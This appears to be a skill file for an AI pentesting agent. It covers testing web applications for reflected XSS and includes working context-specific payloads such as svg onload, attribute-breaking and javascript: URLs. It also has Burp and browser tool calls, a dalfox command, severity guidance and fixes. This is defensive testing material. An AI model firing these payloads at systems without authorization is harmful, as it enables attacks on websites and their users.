---
name: testing-xss-reflected
description: Test for OWASP A03 Reflected XSS in query-string, URL-path, and form-parameter reflection points.
---

# Testing for Reflected XSS (OWASP A03)

## When to use

Prerequisite skills: `methodology-scoping`, `methodology-rules-of-engagement`, `recon-content-discovery`, `recon-sitemap-crawl`, `mcp-burp`, `mcp-browser`.

Use this skill when user-controlled input appears in an HTML response without HTML-context-aware encoding. Reflected XSS arises when the server echoes attacker-supplied data back to the victim's browser in a single round-trip, without storing it, allowing script execution in the context of the vulnerable origin.

## Signal to look for

- Query parameters visibly reflected verbatim in the response body (search results, error messages, greeting text).
- Search endpoints that echo the submitted query string into the page.
- Error pages that repeat the malformed input (404 "path not found: /inject-here", validation errors, etc.).
- Form parameters whose values appear in the rendered HTML after submission (e.g. pre-populated fields, confirmation pages).

## Test steps

1. Inject a unique alphanumeric marker (e.g. `xsscanary12345`) into each candidate parameter via `burp_repeater_send`, then locate the reflection with `burp_proxy_history(contains="xsscanary12345")`. Confirm the exact position in the raw response.

2. Context probe: inspect the raw response around the reflection point to determine the HTML context:
   - **HTML body** — value appears between tags (e.g. `<p>xsscanary12345</p>`).
   - **Attribute** — value inside a tag attribute (e.g. `value="xsscanary12345"`).
   - **JavaScript** — value inside a `<script>` block or JS string literal.
   - **CSS** — value inside a `<style>` block or `style=` attribute.
   - **URL** — value in `href`, `src`, or `action` attribute.

3. Send a context-appropriate payload via `burp_repeater_send(raw_base64=<b64>, host="target.example.com", port=443, secure=true, tab_name="xss-probe")`:
   - HTML body: `"><svg/onload=alert(1)>`
   - Attribute (double-quoted): `" onmouseover="alert(1)` or `"><svg/onload=alert(1)>`
   - JS string: `'-alert(1)-'` or `\`;alert(1)//`
   - URL `href`/`src`: `javascript:alert(1)`

4. Confirm execution in a real browser via `browser_navigate(url="https://target.example.com/search?q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E")`, then call `browser_eval(expression="!!document.querySelector('svg[onload]')")` and verify the return value is `true`.

5. Capture screenshot evidence via `browser_screenshot(full_page=true)` and store per `methodology-evidence-capture`. Include the request URL, response excerpt with the reflection, the `browser_eval` result, and a CSP assessment.

## Tool commands

**Shell:**

```bash
dalfox url "https://target.example.com/search?q=FUZZ"
# Success: dalfox confirms reflected payload and context
```

**MCP:**

```
# Step 1 — inject marker and find reflection
burp_repeater_send(raw_base64=<b64>, host="target.example.com", port=443, secure=true, tab_name="xss-probe")
# Success: {"ok": true, "data": {"tab_id": "..."}}

burp_proxy_history(contains="xsscanary12345")
# Success: {"ok": true, "data": {"items": [...], "total": 1, "cursor": 1}}

# Step 3 — send context-appropriate payload
burp_repeater_send(raw_base64=<b64_with_payload>, host="target.example.com", port=443, secure=true, tab_name="xss-probe")
# Success: {"ok": true, "data": {"tab_id": "..."}}

# Step 4 — confirm execution in browser
browser_navigate(url="https://target.example.com/search?q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E")
# Success: {"ok": true, "data": {"url": "https://target.example.com/search?q=..."}}

browser_eval(expression="!!document.querySelector('svg[onload]')")
# Confirmed: {"ok": true, "data": {"value": true, "type": "boolean", "exception": null}}

# Step 5 — capture evidence
browser_screenshot(full_page=true)
# Success: {"ok": true, "data": {"format": "png", "base64": "iVBORw0K..."}}
```

## Interpret results

- `browser_eval` returning `{"value": true, ...}` confirms JavaScript execution in the target origin — the finding is valid.
- `{"value": false, ...}` means the payload was reflected but did not execute; common causes:
  - **CSP blocks execution** — check the `Content-Security-Policy` response header via `burp_proxy_history`. A strict `script-src` without `unsafe-inline` will prevent inline event handler and `javascript:` payloads. Record the policy verbatim in the finding; the reflection is still a weakness but exploitability is reduced.
  - **Reflected but HTML-entity-encoded** — the server is encoding `<`, `>`, `"` to `&lt;`, `&gt;`, `&quot;`. This is not exploitable for script execution in that context; document as informational or move to a different context/parameter.
- Always include the CSP status (present/absent, effective/bypassable) in the finding regardless of whether execution succeeded.

## Finding writeup

- **Title:** `Reflected XSS in <parameter> at <endpoint>` — e.g. "Reflected XSS in `q` parameter at `/search`".
- **Severity:**
  - Authenticated-origin JS execution (session cookies, tokens accessible): **High**.
  - One-click impact enabling SSO token theft or full account takeover: **Critical**.
  - Execution blocked by effective CSP: **Medium** (reflected without encoding, CSP mitigates).
- **Evidence** (per `methodology-evidence-capture`):
  1. Request URL with payload.
  2. Response excerpt showing the unencoded reflection in context.
  3. Screenshot from `browser_screenshot` with `browser_eval` result showing `"value": true`.
  4. CSP assessment: header value (or absent), whether it blocks the payload, any bypass.
- **Fix:**
  - Primary: context-aware output encoding at the server (HTML-encode for HTML context, JS-encode for script context, attribute-encode for attribute context).
  - Defense-in-depth: deploy a `Content-Security-Policy` header with a strict `script-src` directive to prevent inline execution even if a bypass is later discovered.

## References

- OWASP WSTG CLNT-01: `https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-Based_Cross_Site_Scripting`
- PortSwigger XSS: `https://portswigger.net/web-security/cross-site-scripting`
- CWE-79: `https://cwe.mitre.org/data/definitions/79.html`

## Authorization note

Only use against systems you are authorized to test. This skill assumes the user has obtained written authorization. If authorization is uncertain, stop and confirm scope before proceeding.
